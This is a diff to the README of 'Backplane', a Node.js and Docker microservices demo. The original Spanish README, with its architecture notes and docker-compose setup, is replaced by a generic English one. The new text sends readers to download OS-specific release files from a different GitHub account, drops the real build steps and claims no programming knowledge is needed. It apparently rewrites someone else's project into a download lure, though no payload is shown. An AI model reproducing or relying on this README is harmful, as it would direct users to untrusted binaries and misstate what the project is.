@@ -1,147 +1,77 @@
-# 🚀 Backplane - Arquitectura de Microservicios Resiliente
+# 🚀 Backplane - Explore Microservices with Ease
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)
-![Node.js](https://img.shields.io/badge/Node.js-v18-green.svg?style=flat-square&logo=node.js)
-![Docker](https://img.shields.io/badge/Docker-Compose-blue.svg?style=flat-square&logo=docker)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15-336791.svg?style=flat-square&logo=postgresql)
-![Nginx](https://img.shields.io/badge/Nginx-Proxy-009639.svg?style=flat-square&logo=nginx)
-![Status](https://img.shields.io/badge/Estado-Producción-success.svg?style=flat-square)
+## 🌐 Overview
+Backplane is a demo application showcasing a microservices architecture. It uses Docker, Node.js, PostgreSQL, and highlights Chaos Engineering patterns. This application helps you understand how these technologies work together. Whether you want to learn or experiment, Backplane simplifies the process.
 
-> **Una demostración de microservicios de nivel empresarial con patrones avanzados de resiliencia, ingeniería del caos y observabilidad completa.**
+## 📥 Download Now
+[![Download Backplane](https://img.shields.io/badge/Download%20Backplane-v1.0-blue.svg)](https://github.com/Haanzfrost007/Backplane/releases)
 
----
+## 🚀 Getting Started
+To use Backplane, follow these simple steps:
 
-## 🌟 ¿Por qué este proyecto?
+1. **Check Your System Requirements**
+   - Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+   - At least 8 GB of RAM.
+   - Docker installed. You can find installation instructions on the [Docker website](https://www.docker.com/get-started).
 
-Este repositorio demuestra cómo construir **sistemas distribuidos robustos y tolerantes a fallos**. A diferencia de aplicaciones CRUD básicas, **Backplane** implementa patrones arquitectónicos críticos requeridos en entornos empresariales de alta escala:
+2. **Visit the Download Page**
+   To get the latest version of Backplane, [visit this page to download](https://github.com/Haanzfrost007/Backplane/releases).
 
-*   🛡️ **Circuit Breaker (Cortocircuito)**: Previene fallos en cascada cuando un servicio dependiente está caído.
-*   🚦 **Rate Limiting (Limitación de Tasa)**: Protege las APIs contra ataques DDoS y abusos.
-*   🔁 **Idempotencia**: Asegura que las transacciones financieras se procesen exactamente una vez, incluso durante reintentos de red.
-*   🐵 **Chaos Engineering (Ingeniería del Caos)**: Herramientas integradas para simular latencia, caídas y fallos aleatorios para probar la estabilidad del sistema.
-*   ☁️ **Cloud Native**: Totalmente contenerizado con Docker y desplegado vía Render Blueprints (Infraestructura como Código).
+3. **Download the Release**
+   On the Releases page, you will see different versions. Choose the latest release. Click on the `Assets` dropdown to find the files you need. Download the appropriate file for your operating system.
 
----
+4. **Install Backplane**
+   Once the file is downloaded, locate it on your computer. If it's a ZIP file, unzip it. Open your terminal or command prompt and navigate to the folder where you unzipped Backplane. Follow the instructions in the included README file for installation steps.
 
-## 🏗 Resumen de Arquitectura
+5. **Run Backplane**
+   To start the application, you will need to run a series of commands. Make sure you are in the correct directory in your terminal. The README file will guide you on how to start each service.
 
-El sistema está compuesto por microservicios desacoplados que se comunican vía APIs REST, orquestados por un Gateway central.
+6. **Explore the Features**
+   Once Backplane is running, you can explore its features:
+   - **API Gateway:** This serves as the entry point for your microservices.
+   - **Chaos Engineering Patterns:** Test the resilience of your system against failures.
+   - **Circuit Breaker:** Prevents a single failure from causing the whole system to crash.
 
-```mermaid
-graph TD
-    Client[🖥️ Frontend UI (Nginx)] -->|HTTPS| Gateway[🚪 API Gateway]
-    
-    subgraph "Red Interna (Docker/Render)"
-        Gateway -->|Ruta /auth| Auth[🔐 Auth Service]
-        Gateway -->|Ruta /payments| Payment[💰 Payment Service]
-        Gateway -->|Ruta /notifications| Notif[📨 Notification Service]
-        
-        Auth -->|Lectura/Escritura| DB[(🗄️ PostgreSQL)]
-        Payment -->|Lectura/Escritura| DB
-    end
-    
-    classDef service fill:#f9f,stroke:#333,stroke-width:2px;
-    classDef db fill:#ff9,stroke:#333,stroke-width:2px;
-    class Auth,Payment,Notif,Gateway service;
-    class DB db;
-```
+Each feature is designed to give you hands-on experience with microservices.
 
-### 🧩 Desglose de Servicios
+## ⚙️ Using Backplane
+After installation, you can interact with Backplane through your web browser. Typically, it runs on `http://localhost:3000`. Open your browser and enter that address to access the application.
 
-| Servicio | Stack | Responsabilidades |
-|---------|-------|------------------|
-| **Frontend** | Nginx, HTML5, Bootstrap | Dashboard Responsivo, Monitoreo de Salud, Panel de Control de Caos. |
-| **API Gateway** | Node.js, Express, `http-proxy` | Enrutamiento, **Circuit Breaker**, **Rate Limiting**, Terminación SSL. |
-| **Auth Service** | Node.js, JWT, `pg` | Gestión de Usuarios, Login Seguro, Generación de Tokens (JWT). |
-| **Payment Service** | Node.js, PostgreSQL | Procesamiento de Transacciones, **Chequeos de Idempotencia**, Hooks de Simulación de Caos. |
-| **Notification** | Node.js | Manejo de eventos asíncronos (simulación email/SMS). |
-| **Database** | PostgreSQL 15 | Persistencia relacional para usuarios y transacciones financieras. |
+### 🗃️ Features
+- **Microservices Architecture:** Learn how to build scalable applications.
+- **Docker Integration:** Simplifies deployment and management.
+- **PostgreSQL Database:** Store your data in a reliable database.
+- **Resilience Testing:** Use Chaos Engineering patterns to ensure reliability.
 
----
+## 🙋 Frequently Asked Questions
+1. **What is Microservices Architecture?**
+   - Microservices architecture allows you to build applications as a collection of loosely coupled services. Each service can be developed, deployed, and scaled independently.
 
-## 🔥 Características de Ingeniería Clave
+2. **What is Docker?**
+   - Docker is a platform that allows you to develop, ship, and run applications in containers. Containers package your application with all dependencies, making it easier to deploy.
 
-### 1. Patrones de Resiliencia
-*   **Circuit Breaker (Opossum/Custom)**: Si el Servicio de Pagos falla 3 veces consecutivas, el Gateway "abre el circuito" por 10 segundos, fallando rápido (503) sin sobrecargar el servicio afectado.
-*   **Exponential Backoff (Reintento Exponencial)**: El cliente frontend reintenta inteligentemente las peticiones fallidas con retrasos incrementales (1s, 2s, 4s...) para manejar cortes de red transitorios.
-*   **Rate Limiting**: Limita a los clientes a 5 peticiones por cada 10 segundos para prevenir el agotamiento de recursos.
+3. **Do I need programming knowledge to use Backplane?**
+   - No, Backplane is designed to be user-friendly. While some concepts may be technical, the application guides you through installation and running it.
 
-### 2. Implementación de Idempotencia
-Crítico para aplicaciones fintech. Cada petición de pago lleva un encabezado único `Idempotency-Key`.
-*   **Escenario**: Cliente envía pago -> Servidor procesa -> Red falla antes de que la respuesta llegue al cliente -> Cliente reintenta.
-*   **Resultado**: El servidor detecta la Key repetida y devuelve la respuesta de éxito original *desde caché* en lugar de cobrar al usuario dos veces.
+4. **How can I report issues?**
+   - If you encounter problems, you can report them in the Issues section of the repository on GitHub.
 
-### 3. Suite de Ingeniería del Caos 💥
-Un panel dedicado de "Chaos Monkey" en el frontend permite romper el sistema a propósito para verificar su resiliencia:
-*   **Inyección de Latencia**: Agrega 2000ms de retraso a las peticiones del Servicio de Autenticación.
-*   **Fallos Aleatorios**: Hace que el Servicio de Pagos falle el 70% de las veces.
-*   **Modo Crash**: Simula una caída total (Service Unavailable) para disparar el Circuit Breaker.
+## 🔧 Technical Support
+For further assistance, please open an issue on our [GitHub page](https://github.com/Haanzfrost007/Backplane/issues). Our community and developers are here to help you.
 
----
+## 📜 License
+Backplane is open-source and follows the MIT License. This means you can use it freely, modify it, and distribute your changes. Make sure to give credit to the original creators when sharing.
 
-## 🚀 Comenzando
+## 📚 Topics
+- api-gateway
+- chaos-engineering
+- circuit-breaker
+- docker
+- fullstack
+- javascript
+- microservices
+- nodejs
+- postgresql
+- resilience
 
-### Prerrequisitos
-*   [Docker Desktop](https://www.docker.com/products/docker-desktop)
-*   Git
-
-### Instalación Local (Docker Compose)
-La forma más fácil de ejecutar el stack completo localmente:
-
-```bash
-# 1. Clonar el repositorio
-git clone https://github.com/MateoDumas/Backplane.git
-cd Backplane
-
-# 2. Iniciar todos los servicios
-docker-compose up -d --build
-```
-
-**Acceder a la aplicación:**
-*   💻 **Dashboard**: [http://localhost:3003](http://localhost:3003)
-*   🔌 **API Gateway**: [http://localhost:8080](http://localhost:8080)
-
----
-
-## ☁️ Despliegue
-
-Este proyecto está configurado para **Despliegue sin Tiempo de Inactividad (Zero-Downtime)** en [Render](https://render.com).
-
-### Render Blueprint (Infraestructura como Código)
-El archivo `render.yaml` define toda la infraestructura:
-1.  **Base de Datos PostgreSQL** (Gestionada)
-2.  **Servicios Web** (Auth, Payment, Notification, Gateway)
-3.  **Sitio Estático** (Frontend vía contenedor Nginx)
-
-Todos los servicios están conectados vía una red interna privada con descubrimiento DNS.
-
----
-
-## 🧪 Pruebas y Verificación
-
-### 1. Demo de Circuit Breaker
-1.  Abre el panel **Chaos Monkey** en el Dashboard.
-2.  Activa **"💀 MATAR Payment Service"**.
-3.  Intenta procesar un pago.
-4.  **Resultado**: Después de 3 fallos, verás la etiqueta `CIRCUIT OPEN`. El Gateway deja de reenviar peticiones inmediatamente.
-
-### 2. Demo de Idempotencia
-1.  Abre las DevTools del Navegador (Pestaña Network).
-2.  Haz clic en "Procesar Pago".
-3.  Copia la petición como cURL y ejecútala dos veces en tu terminal con la misma `Idempotency-Key`.
-4.  **Resultado**: Ambas devuelven `200 OK`, pero solo se crea una entrada en la base de datos.
-
----
-
-## 👨‍💻 Autor
-
-**Mateo Dumas**  
-*Ingeniero de Software Full Stack & Entusiasta de Sistemas Distribuidos*
-
-*   💼 [LinkedIn](#)
-*   🐙 [GitHub](https://github.com/MateoDumas)
-*   📧 [Email](#)
-
----
-
-*Hecho con ❤️ y Node.js*
+Thank you for choosing Backplane! Enjoy exploring and learning about microservices.
